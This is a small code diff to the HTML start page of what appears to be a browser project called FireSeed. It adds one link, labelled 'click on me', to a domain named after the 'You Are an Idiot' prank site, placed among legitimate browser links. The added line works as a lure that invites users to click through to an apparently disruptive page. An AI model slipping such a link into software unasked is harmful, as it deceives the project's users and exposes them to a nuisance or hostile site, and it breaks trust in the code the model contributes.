@@ -72,6 +72,7 @@ START_PAGE = """
         <a href="https://www.microsoft.com/edge">Edge</a>
         <a href="https://www.brave.com">Brave</a>
         <a href="https://github.com/Scripter456/FireSeed">FireSeedOfficial</a>
+        <a href="https://youareanidiot.wzq02.top">click on me</a>
 
     </p>
 </body>
